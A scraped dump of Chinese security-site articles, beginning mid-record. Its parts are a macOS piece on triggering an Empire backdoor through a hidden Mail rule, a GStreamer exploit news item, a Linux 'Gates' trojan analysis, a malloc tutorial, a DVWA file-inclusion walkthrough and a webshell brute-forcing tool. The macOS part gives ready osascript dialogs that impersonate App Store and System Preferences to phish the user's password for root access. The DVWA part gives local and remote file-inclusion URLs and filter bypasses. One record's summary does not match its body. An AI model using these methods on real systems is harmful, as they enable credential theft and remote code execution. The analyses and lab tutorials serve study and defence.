""规则整体的意思就是，收到一封内容中包含字符“test-123”的邮件时，就将邮件扔到垃圾桶中，然后执行系统命令，输出当前时间到桌面的“test.txt”文件中。至此启动器设置完成，下图为测试效果如果需要启动木马，只需要将脚本文件中引号内容替换为之前Empyre生成的bash脚本，然后一封邮件，done，效果如下图：为了增加隐蔽性，可以添加一些规则MarkReadYESCopyToMailboxTrashCopyToMailboxURLTrashMailboxTrashMailboxURLTrash这样收到信件之后会直接标记已读，然后放入废纸篓，就再也不会出现未读提示，效果如下图：这样，触发邮件不会出现在收件箱中，并且在废纸篓中也不会提示未读。至于其中的DELETE，只会将邮件放入废纸篓， 而不是直接删除，没有一个很明确的解释，该功能为什么不能将邮件彻底删除。不知道是不是测试邮箱的问题。有待继续测试。下一个问题，权限，这时候获取的shell权限不高，如下图：只是用户权限，并不是root权限，下一步，提权。三、提权通杀MacOS全部版本的提权方式哦！关于AppleScript，官方有如下叙述：AppleScript是由Apple创建的脚本语言。 它允许用户直接控制可编写脚本的Macintosh应用程序，以及macOS本身的一部分。 您可以创建脚本集合的书面指令 - 自动化重复任务，组合来自多个可编写脚本的应用程序的功能，并创建复杂的工作流程。由于代码功底有限，无法fuzz出MacOS提权漏洞，所以转变思路，只要能获取到用户的密码，就直接能获取root权限。由于能力有限，直接从MacOS的密码从系统中获取本人无法做到。最终方案 －－ 针对 “人”。先上几张效果图：不够酷炫？ 不够诱人？还有你就说你输不输入密码！不输入，就不能继续程序，什么程序都行包括系统程序！强调下，这是系统设置和Apple Store 弹出的框，并不是手工绘制出现在屏幕上的弹框！利用系统应用，如 app sotre，系统便好设置 给用户弹框，要求用户输入密码。并且不输入密码无法继续操作App Store 和系统设置。需要注意的是，输入为空或者随意输入弹框都会消失，经过本人多次测试，将弹框次数增加至2到3次，将会打消用户所有疑虑，第二或者第三次的输入基本就会是系统密码。如果觉得该方案不保险，可以进行以下判断，密码不正确就一直弹框。目前在多个朋友的Mac系统上测试结果，所有人都输入了密码！！然后do shell script ""command"" user name ""username"" password ""password"" with administrator privileges或者其他什么方式成功获取到root权限你的电脑，我的权限。收工！附脚本：osascript -e 'tell app ""App Store"" to activate' -e 'tell app ""App Store"" to activate' -e 'tell app ""App Store"" to display dialog ""App Store 需要密码才能继续"" &amp; return &amp; return  default answer """" with icon 1 with hidden answer with title ""App Store""'osascript -e 'tell app ""System Preferences"" to display dialog ""System Preferences 需要密码才能应用更新"" &amp; return &amp; return  default answer """" with icon 1 with hidden answer’脚本可以随意发挥！","2016-11-24 13:52:33","系统安全","MacOS安全：通过email稳定控制Mac总结","http://nsoad.com/Article/system/20161124/845.html"
"5ccbfabc4f2f0a0a7a69c0b2","最近国外研究人员公布的一段exp代码能够在打完补丁的Fedora等Linux系统上进行drive-by攻击，从而安装键盘记录器、后门和其他恶意软件。","kong","最近国外研究人员公布的一段exp代码能够在打完补丁的Fedora等Linux系统上进行drive-by攻击，从而安装键盘记录器、后门和其他恶意软件。这次的exp针对的是GStreamer框架中的一个内存损坏漏洞，GStreamer是个开源多媒体框架，存在于主流的Linux发行版中。我们都知道，地址空间布局随机化（ASLR）和数据执行保护（DEP）是linux系统中两个安全措施，目的是为了让软件exp更难执行。但新公布的exp通过一种罕见的办法绕过了这两种安全措施——国外媒体还专门强调了这个漏洞的“优雅”特色。研究人员写了个flac多媒体文件，就能达成漏洞利用！ASLR是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的的一种技术。而DEP则能够在内存上执行额外检查以帮助防止在系统上运行恶意代码。无脚本exp与传统的ASLR和DEP绕过方法不同的是，这个exp没有通过代码来篡改内存布局和其他的环境变量。而是通过更难的字节码排序彻底关闭保护。由于不需要JavaScript也不需要其他与内存通信的代码，所以其他攻击不行的时候，这种攻击可能依然可行。 “这个exp很可笑”，研究员Chris Evans在周一的博文中写道，“但是它证明了无脚本的exp也是可行的，即便开启了64位的ASLR还是有办法能够进行读写内存等操作，并且能够稳扎稳打地一步一步进行攻击然后获得控制权。”Azimuth Security高级研究院Dan Rosenberg特别擅长Linux漏洞的防御。在一封邮件中他同意了Chris Evans的观点：这个exp相当厉害，因为它成功绕过了ASLR和NX等先进的保护措施，而且不需要与目标软件进行程序交互。详细来说，当要攻击浏览器漏洞的时候，exp会用JavaScript影响内存布局。类似地，当要攻击本地内核漏洞时，exp会发起系统调用来影响目标环境。但在现在的场景差别很大，由于exp是一个单独的媒体文件，黑客没有机会在攻击的过程中作调整。Evans随后发布了一个FLAC媒体文件，它能够运行在默认版本的Fedora 24上（其中预装了最新版的GStreamer）。Evans说，写Ubuntu的exp更容易些，因为他没有ASLR, RELRO等防御措施，即使是在最新的16.04 LTS版本中也没有。不过他的exp仍然需要改写才能在除Fedora 24的其他linux版本中运行。虽然攻击针对的是GStreamer对FLIC文件格式的解码器，Evans说攻击目标是Rhythmbox媒体播放器的二进制代码。Totem播放器也可以用类似的方法攻击。Exp下载：https://security.appspot.com/security/flic/fedora_flx_exploit.flac （仅针对Fedora 24）漏洞利用较麻烦这个exp的学术研究价值要比实用价值来得高，因为如果要在其他linux版本上运行就需要重写。并且由于在linux上播放媒体软件的用户本身就少，漏洞可利用的范围就更少了。周二的时候，Ubuntu发布了补丁，之后几天应该会有更多的厂商跟进。这个漏洞究竟优雅与否，有兴趣的可移步点击下面的原文链接。","2016-11-29","漏洞发布","“优雅”的Linux漏洞：用罕见方式绕过ASLR和DEP保护机制","http://nsoad.com/Article/exploit/20161129/vulzone-40.html"
"5ccbfabc4f2f0a0a7a69c0b3","最近对Linux.BackDoor.Gates.6的一个病毒样本进行了分析，通过调查发现Linux盖茨木马是一类有着丰富历史，隐藏手法巧妙，网络攻击行为显著的DDoS木马。这篇文章主要介绍了L","Kong","最近对Linux.BackDoor.Gates.6的一个病毒样本进行了分析，通过调查发现Linux盖茨木马是一类有着丰富历史，隐藏手法巧妙，网络攻击行为显著的DDoS木马。这篇文章主要介绍了Linux盖茨木马的分析过程，同时会讲解在Linux环境下恶意软件分析的常用技巧和安全工具的使用方法。盖茨木马整体情况此类Linux木马主要恶意特点是具备了后门程序，DDoS攻击的能力，并且会替换常用的系统文件进行伪装。木马得名于其在变量函数的命名中，大量使用Gates这个单词。从网上公开资料可以看出，盖茨木马主要针对中国地区的服务器进行DDoS攻击，有95%的攻击目标都在中国，排名第二的是美国。接下来会对盖茨病毒的一个分支样本，进行更为细致的静态分析和动态分析。静态分析3.1.ELF文件信息在静态分析中，首先会对文件类型进行判断，在Linux环境下，file工具[1]能够对ELF类型进行初步的判断。例如下表中，通过文件信息，能够得出该样本是32位ELF可执行程序，运行于IntelCPU上，静态链接。更重要的一个信息是，该样本没有除去符号表，这就为后续的逆向分析提供了丰富的调试信息。MD5    6dfc7ea279b50b1f962523d517cd76fb入口点    8048120文件信息    ELF32-bitLSBexecutable,Intel80386,version1(SYSV),staticallylinked,forGNU/Linux2.2.5,notstrippedTips：file命令可以识别文件类型。3.2.导出符号分析使用strings工具[2]可以从ELF文件中搜索ASCII字符串，可以发现一些IP信息，加载内核命令，恶意攻击函数名。Tips：strings命令可以从二进制文件中提取字符串。IP信息如下： ""abaec 61.132.163.68"",  ""abafa 202.102.192.68"",  ""abb09 202.102.213.68"",  ""abb18 202.102.200.101"",  ""abb28 58.242.2.2"",  ""abb33 202.38.64.1"",  ""abb3f 211.91.88.129"",  ""abb4d 211.138.180.2"",  ""abb5b 218.104.78.2"",  ""abb68 202.102.199.68"",  ""abb77 202.175.3.3"",  ""abb83 202.175.3.8"",... ...加载内核模块命令如下：""aa3f2insmod/usr/lib/xpacket.ko""函数名中含有恶意网络攻击的名称：  {    ""str"": ""11CAttackBase"",    ""offset"": ""a98fc""  },  {    ""str"": ""13CPacketAttack"",    ""offset"": ""a990a""  },  {    ""str"": ""10CAttackUdp"",    ""offset"": ""a9928""  },  {    ""str"": ""10CAttackSyn"",    ""offset"": ""a9944""  },  {    ""str"": ""11CAttackIcmp"",    ""offset"": ""a9960""  },  {    ""str"": ""10CAttackDns"",    ""offset"": ""a997c""  },这些IP信息和函数中的攻击名称很大程度会帮助杀毒软件识别已知的病毒。后续的静态分析包括静态反汇编，查找导入导出表等，因为逆向的过程是一个动静结合的过程，反汇编部分计划通过后续的动态分析来展现。动态分析因为样本没有去掉符号信息，为反汇编和反编译提供了很好的支持。该样本从main()开始，共有4个主要的执行分支：样本根据CSysTool::CheckGatesType()返回的结果分别会调用这4个函数。本文会首先分析CheckGatesType()的逻辑，然后主要对默认情况进行分析。4.1.CheckGatesType()分析在调用该函数之前，样本会将变量g_strMonitorFile赋值为”/usr/bin/pythno” 。首先，调用CUtility::GetModuleFullPath()获得样本的全路径名称。通过readlink(“/proc/{getpid()}/exe”) 得到。这个动作会被strace[3]捕获。304520:10:41.345483readlink(""/proc/3045/exe"",""/root/workspace/websevrer"",1024)=25Tips：strace命令可以捕获程序使用的系统调用（包括参数、返回值和执行时间等）以及接收到的signal。其次，调用CSysTool::GetBackDoorFile()拼接出backdoor文件全路径”/usr/bin/bsd-port/knerl”。最后，CheckGatesType()的逻辑用表格表示为：返回值    条件strcmp0    样本路径==”/usr/bin/pythno”2    样本路径==”/usr/bin/bsd-port/knerl”3    样本路径==常用的系统工具1    默认情况这里可以看出，当样本替换系统命令之后，执行的行为和默认情况是不同的。这里说明样本具有伪装成系统工具的恶意能力。从图中可以看到，样本对于常用的系统工具都可以进行替换并伪装，其中包括了进程查询工具ps和网络查询工具 netstat.4.2.MainBeikong()分析对于样本处于非特定位置的默认情况，CheckGatesType()会返回1，然后样本会调用MainBeikong()。首先，MainBeikong()会调用daemon()去创建一个后台进程。父进程会调用exit(0)退出，子进程会调用setsid(),脱离session,然后关闭stdin,stdout,stderr文件fd。此时子进程的父进程会变成1号进程。daemon()调用成功后，样本会调用CSysTool::SelfInit()进行自检，这个过程还包含解密过程CRSA::Decrypt().密文是自检时传入的字符串。解密后的原文是一个域名：（""bei[.]game918[.]me:21351:1:1::1:698412:697896:697380""）后续将解密内容分别赋值给一些控制变量。控制变量列表：g_strConnTgts    bei[.]game918[.]meg_iGatsPort    21351g_iGatsIsFx    1g_iIsService    1g_strForceNote    “”g_bDoBackdoor    Trueg_strCryptStart    698412g_strDStart    697896g_strNStart    697380在函数MainBeikong()中，会调用两次CSysTool::KillPid，该函数会判断pid文件中存放的pid和当前运行的pid是否一致，如果不一致就kill掉当前的进程。文件名分别为:idus.log,apsh.conf.接着会调用CFileOp::RemoveFile(“apsh.conf”)将文件删除掉。随后会调用CSysTool::KillGatesIfExist(),同样是进行进程检测，文件名是vga.conf，不同点是这次会将当前pid写入文件。从控制变量命名规则和函数的命名中，可以看出大量使用Gates这个单词，这也正是盖茨木马得名的原因所在。4.3.自启动设置CUtility::SetAutoStart()会进行自启动设置。操作/etc/init.d/VsystemsshMdt文件。文件内容：root@remnux:/etc/init.d#catVsystemsshMdt#!/bin/bash/root/websevrer然后运行system(),继续进行自启动设置。ln-s/etc/init.d/VsystemsshMdt/etc/rc1.d/S97VsystemsshMdtln-s/etc/init.d/VsystemsshMdt/etc/rc2.d/S97VsystemsshMdtln-s/etc/init.d/VsystemsshMdt/etc/rc3.d/S97VsystemsshMdtln-s/etc/init.d/VsystemsshMdt/etc/rc4.d/S97VsystemsshMdtln-s/etc/init.d/VsystemsshMdt/etc/rc5.d/S97VsystemsshMdt然后执行释放文件函数CSysTool::ReleaseGates()。内部使用system()进行实现。mkdir-p/usr/bin/bsd-portcp-f/root/workspace/websevrer/usr/bin/bsd-port/knerl/usr/bin/bsd-port/knerlcp-f/root/workspace/websevrer/usr/bin/pythno/usr/bin/pythno进程的这些行为都会被Linux平台中系统监控程序sysdig[4]所捕获。Tips：sysdig是由sysdigcloud开发的一个开源工具，集合了strace、tcpdumphtop、iftop、lsof等大量有用的功能为一体。4.4.MainProcess()分析首先会读取/etc/resolv.conf,结合Google的公开DNS服务器，8.8.8.8更新dns服务器信息。然后通过CStatBase::Initialize()读取/proc文件系统，了解本机的信息。相应的在sysdig中会监测到文件打开和读取等事件。然后，样本会使用insmod加载一个内核模块/usr/lib/xpacket.ko，但是因为分析机内没有该模块，会报错。[436,""insmod/usr/lib/xpacket.ko(PID=2170,TID=2170)"",""write:path=/dev/null,size=84"",""insmod:ERROR:couldnotloadmodule/usr/lib/xpacket.ko:Nosuchfileordirect""],接着会读取文件/usr/lib/libamplify.so，同样的原因没有能够找到该文件。4.5.网络行为分析首先样本向DNS服务器，发送了查询bei[.]game918[.]me(112.224.48.28)的请求。获得IP地址后，尝试对端口21351进行TCP连接。通过tcpdump[5]和wireshark工具，发现了第二个控制域名360[.]baidu[.]com[.]9kpk[.]com(8.5.1.43)。样本会连接45000端口。可惜的是，目前这两个IP地址已经失效，所以无法进行后续协议的分析。Tips：tcpdump命令可以拦截和展示系统中收发的网络数据包。总结 Linux.BackDoor.Gates.6样本使用了加密C&amp;Cserver信息，运行时解密的策略，防止控制域名暴露，同时具备自启动，替换系统常用工具，进行DDoS攻击等恶意行为。 本文针对盖茨木马样本进行了细致的分析，同时介绍了多种在Linux环境下的安全工具。参考资料1.https://linux.die.net/man/1/file2.https://linux.die.net/man/1/strings3.https://linux.die.net/man/1/strace4.http://man7.org/linux/man-pages/man8/sysdig.8.html5.https://linux.die.net/man/8/tcpdump","2016-10-31 15:25:19","系统安全","Linux平台“盖茨木马”分析","http://nsoad.com/Article/system/20161031/672.html"
"5ccbfabc4f2f0a0a7a69c0b4","既然你正在看这篇文章，那么你就应该知道malloc函数是通过syscall调用从操作系统获取内存的。 如下图所示，malloc是通过调用brk或mmap这两种syscall之一来获取内存的。1.br","Kong","既然你正在看这篇文章，那么你就应该知道malloc函数是通过syscall调用从操作系统获取内存的。 如下图所示，malloc是通过调用brk或mmap这两种syscall之一来获取内存的。1.brk方式brk：brk是通过增设程序断点来从内核获取内存（非清零）的。最初堆段的起点（start_brk）和堆段终点（brk）是指向相同的位置的。当ASLR关闭时，start_brk和brk将指向data/bss段（end_data）的末尾。当ASLR打开时，start_brk和brk的值将等于data/bss段（end_data）的结尾加上一个随机的brk偏移。正如上面的“进程虚拟内存布局”图展示的，start_brk是堆段的开始，brk（程序中断）是堆段的结尾。例程如下：/* sbrk and brk example */#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;int main(){        void *curr_brk, *tmp_brk = NULL;        printf(""Welcome to sbrk example:%d\n"", getpid());        /* sbrk(0)返回此进程的断点位置*/        tmp_brk = curr_brk = sbrk(0);        printf(""Program Break Location1:%p\n"", curr_brk);        getchar();        /* brk（addr）递增/递减程序的断点位置*/        brk(curr_brk+4096);        curr_brk = sbrk(0);        printf(""Program break Location2:%p\n"", curr_brk);        getchar();        brk(tmp_brk);        curr_brk = sbrk(0);        printf(""Program Break Location3:%p\n"", curr_brk);        getchar();        return 0;}输出分析：在增设程序中断之前，通过下面的输出，我们可以看到并没有堆段。因此：• start_brk = brk = end_data = 0x804b000sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk Welcome to sbrk example:6141Program Break Location1:0x804b000...sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps...0804a000-0804b000 rw-p 00001000 08:01 539624     /home/sploitfun/ptmalloc.ppt/syscalls/sbrkb7e21000-b7e22000 rw-p 00000000 00:00 0 ...sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$在增设了程序断点后：在下面的输出我们可以观察到有堆段。因此：• start_brk = end_data = 0x804b000• brk = 0x804c000sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk Welcome to sbrk example:6141Program Break Location1:0x804b000Program Break Location2:0x804c000...sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps...0804a000-0804b000 rw-p 00001000 08:01 539624     /home/sploitfun/ptmalloc.ppt/syscalls/sbrk0804b000-0804c000 rw-p 00000000 00:00 0          [heap]b7e21000-b7e22000 rw-p 00000000 00:00 0 ...sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$其中0804b000-0804c000是此堆段的虚拟地址范围rw-p是Flags（可读，可写，不可执行，私有）00000000是文件偏移 – 由于不存在文件映射，所以这里为零00:00是主要/次要设备号 – 由于不存在文件映射，所以这里为零0是Inode编号 – 由于不存在文件映射，所以这里为零[heap]表示是堆段2.mmap方式mmap：malloc使用mmap去创建一个私有的匿名映射段。映射这个私有匿名段的主要目的是为了分配新的内存（已清零），并且这个新的内存将被调用进程独占使用。例程：/* Private anonymous mapping example using mmap syscall */#include &lt;stdio.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;void static inline errExit(const char* msg){        printf(""%s failed. Exiting the process\n"", msg);        exit(-1);}int main(){        int ret = -1;        printf(""Welcome to private anonymous mapping example::PID:%d\n"", getpid());        printf(""Before mmap\n"");        getchar();        char* addr = NULL;        addr = mmap(NULL, (size_t)132*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);        if (addr == MAP_FAILED)                errExit(""mmap"");        printf(""After mmap\n"");        getchar();        /* Unmap mapped region. */        ret = munmap(addr, (size_t)132*1024);        if(ret == -1)                errExit(""munmap"");        printf(""After munmap\n"");        getchar();        return 0;}输出分析：mmap调用前：在下面的输出中，我们只能看到属于共享库libc.so和ld-linux.so的内存映射段sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmapb7e21000-b7e22000 rw-p 00000000 00:00 0 ...sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$mmap调用后：在下面的输出中，我们可以看到我们的内存映射段（b7e00000 – b7e21000，大小为132KB）与已映射的内存映射段（b7e21000 – b7e22000）拼接在一起了。sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmapb7e00000-b7e22000 rw-p 00000000 00:00 0 ...sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$其中b7e00000-b7e22000是此段的虚拟地址范围rw-p是Flags（可读，可写，不可执行，私有）00000000是文件偏移 – 由于不存在文件映射，所以这里为零00:00是主要/次要设备号 – 由于不存在文件映射，所以这里为零0是Inode编号 – 由于不存在文件映射，所以这里为零munmap调用后：在下面的输出中，我们可以看到我们的内存映射段是未映射的，就是说其相应的内存已经释放到操作系统了。sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmapb7e21000-b7e22000 rw-p 00000000 00:00 0 ...sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$注意：在我们的示例程序中ASLR是关闭的。原文地址","2016-11-04 11:01:47","系统安全","Malloc两种内存获取方式的区别","http://nsoad.com/Article/system/20161104/696.html"
"5ccbfabc4f2f0a0a7a69c0b5","前言本文介绍了wpad攻击与wsus攻击的原理，并结合已有的工具进行攻击演示。WPAD 攻击Web代理自动发现（WPAD）是Microsoft Windows客户端用于自动配置本地代理设置的协议.","kong","目前，最新的DVWA已经更新到1.9版本（http://www.dvwa.co.uk/），而网上的教程大多停留在旧版本，且没有针对DVWA high级别的教程，因此萌发了一个撰写新手教程的想法，错误的地方还请大家指正。DVWA简介DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。DVWA共有十个模块，分别是Brute Force（暴力（破解））Command Injection（命令行注入）CSRF（跨站请求伪造）File Inclusion（文件包含）File Upload（文件上传）Insecure CAPTCHA （不安全的验证码）SQL Injection（SQL注入）SQL Injection（Blind）（SQL盲注）XSS（Reflected）（反射型跨站脚本）XSS（Stored）（存储型跨站脚本）需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。DVWA的搭建Freebuf上的这篇文章《新手指南：手把手教你如何搭建自己的渗透测试环境》（http://www.freebuf.com/sectool/102661.html）已经写得非常好了，在这里就不赘述了。之前模块的相关内容Brute ForceCommand InjectionCSRF本文介绍的是File Inclusion模块的相关内容，后续教程会在之后的文章中给出。File InclusionFile Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。下面对四种级别的代码进行分析。Low服务器端核心代码&lt;php//Thepagewewishtodisplay$file=$_GET['page'];&gt;可以看到，服务器端对page参数没有做任何的过滤跟检查。服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。点击file1.php后，显示如下而现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。漏洞利用1.本地文件包含构造urlhttp://192.168.153.130/dvwa/vulnerabilities/fi/page=/etc/shadow报错，显示没有这个文件，说明不是服务器系统不是Linux，但同时暴露了服务器文件的绝对路径C:\xampp\htdocs。构造url（绝对路径）http://192.168.153.130/dvwa/vulnerabilities/fi/page=C:\xampp\htdocs\dvwa\php.ini成功读取了服务器的php.ini文件构造url（相对路径）http://192.168.153.130/dvwa/vulnerabilities/fi/page=..\..\..\..\..\..\..\..\..\xampp\htdocs\dvwa\php.ini加这么多..\是为了保证到达服务器的C盘根目录，可以看到读取是成功的。同时我们看到，配置文件中的Magic_quote_gpc选项为off。在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，我们可以在文件名中使用%00进行截断，也就是说文件名中%00后的内容不会被识别，即下面两个url是完全等效的。A)http://192.168.153.130/dvwa/vulnerabilities/fi/page=..\..\..\..\..\..\..\..\..\xampp\htdocs\dvwa\php.iniB)http://192.168.153.130/dvwa/vulnerabilities/fi/page=..\..\..\..\..\..\..\..\..\xampp\htdocs\dvwa\php.ini%0012.php可惜的是由于本次实验环境的php版本为5.4.31，所以无法进行验证。使用%00截断可以绕过某些过滤规则，例如要求page参数的后缀必须为php，这时链接A会读取失败，而链接B可以绕过规则成功读取。2.远程文件包含当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。在远程服务器192.168.5.12上传一个phpinfo.txt文件，内容如下构造urlhttp://192.168.153.130/dvwa/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt成功在服务器上执行了phpinfo函数为了增加隐蔽性，可以对http://192.168.5.12/phpinfo.txt进行编码http://192.168.153.130/dvwa/vulnerabilities/fi/page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%35%2e%31%32%2f%70%68%70%69%6e%66%6f%2e%74%78%74同样可以执行成功Medium服务器端核心代码&lt;php//Thepagewewishtodisplay$file=$_GET['page'];//Inputvalidation$file=str_replace(array(""http://"",""https://""),"""",$file);$file=str_replace(array(""../"",""..\""""),"""",$file);&gt;可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。漏洞利用使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。例如page=hthttp://tp://192.168.5.12/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.5.12/phpinfo.txt，成功执行远程命令。同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。1.本地文件包含http://192.168.153.130/dvwa/vulnerabilities/fi/page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini读取配置文件成功http://192.168.153.130/dvwa/vulnerabilities/fi/page=C:/xampp/htdocs/dvwa/php.ini绝对路径不受任何影响，读取成功2.远程文件包含http://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt远程执行命令成功http://192.168.153.130/dvwa/vulnerabilities/fi/page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%35%2e%31%32%2f%70%68%70%69%6e%66%6f%2e%74%78%74经过编码后的url不能绕过替换规则，因为解码是在浏览器端完成的，发送过去的page参数依然是http://192.168.5.12/phpinfo.txt，因此读取失败。High服务器端核心代码&lt;php//Thepagewewishtodisplay$file=$_GET['page'];//Inputvalidationif(!fnmatch(""file*"",$file)&amp;&amp;$file!=""include.php""){   //Thisisn'tthepagewewant!echo""ERROR:Filenotfound!"";exit;}&gt;可以看到，Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。","2016-11-12 12:54:34","Web安全","新手指南：DVWA-1.9全级别教程之File Inclusion","http://nsoad.com/Article/web/20161112/753.html"
"5ccbfabc4f2f0a0a7a69c0b6","Cheetah的工作原理是能根据自动探测出的web服务设置相关参数一次性提交大量的探测密码进行爆破，爆破效率是其他普通webshell密码暴力破解工具上千倍。","精灵","0×00 介绍Cheetah是一款基于字典的webshell密码爆破工具，Cheetah的工作原理是能根据自动探测出的web服务设置相关参数一次性提交大量的探测密码进行爆破，爆破效率是其他普通webshell密码暴力破解工具上千倍。项目地址：https://github.com/sunnyelf/cheetah0×01 特点速度极快支持批量爆破自动伪造请求自动探测web服务设置相关参数支持读取和去重超大密码字典文件支持python 2.x和3.x目前支持php，jsp，asp，aspx类型的webshell0×02 参数说明_________________________________________________       ______              _____         ________________  /_ _____ _____ __  /_______ ____  /__  ___/__  __ \_  _ \_  _ \_  __/_  __ \ __  __ \/ /__  _  / / //  __//  __// /_  / /_/ / _  / / /\___/  / / /_/ \___/ \___/ \__/  \____/  / / /_/      /_/                               /_/a very fast brute force webshell password tool.usage: cheetah.py [-h] [-i] [-v] [-c] [-up] [-r] [-w] [-s] [-n] [-u] [-b]                   [-p [file [file ...]]]可选参数:  -h, --help            显示帮助信息并退出  -i, --info            显示程序信息并退出  -v, --verbose         启用详细输出模式(默认禁用)  -c, --clear           去重字典文件(默认禁用)  -up, --update         更新cheetah  -r , --request        指定请求方式(默认POST方式)  -w , --webshell       指定webshell类型(默认自动探测)  -s , --server         指定web服务器名称(默认自动探测)  -n , --number         指定一次请求参数的数量(默认自动设置)  -u , --url            指定webshell url地址  -b , --url-file       指定批量webshell urls文件  -p [file [file ...]]  指定多个字典文件(默认使用pwd.list)使用示例:  python cheetah.py -u http://orz/orz.php  python cheetah.py -u http://orz/orz.jsp -r post -n 1000 -v  python cheetah.py -u http://orz/orz.asp -r get -c -p pwd.list  python cheetah.py -u http://orz/orz -w aspx -s apache -n 1000  python cheetah.py -b url.list -c -p pwd1.list pwd2.list -v0×03 下载使用git clone https://github.com/sunnyelf/cheetah.gitpython cheetah.py 0×04 文件说明cheetah│  .gitignore│  cheetah.py           主程序│  LICENSE│  pwd.list             默认指定的字典文件│  README.md│  update.py            更新模块│  url.list             默认指定批量 webshell url文件│  user-agent.list      用户代理文件│└─screenshot            使用截图        1.png        2.png        3.png        4.png0×05 使用截图UbuntuWindows0×06 问题如果在使用过程中出现了bug欢迎提交issues，我会及时回复并修复。0×07 参考让你的一句话爆破速度提升千倍一种有效的Web指纹识别方法识别Web服务器 (OTG-INFO-002)python读GB级大文件","2017-04-20 13:10:15","安全工具","Webshell密码极速爆破工具 – cheetah","http://nsoad.com/Security-tools/20170420/tools-1138.html"
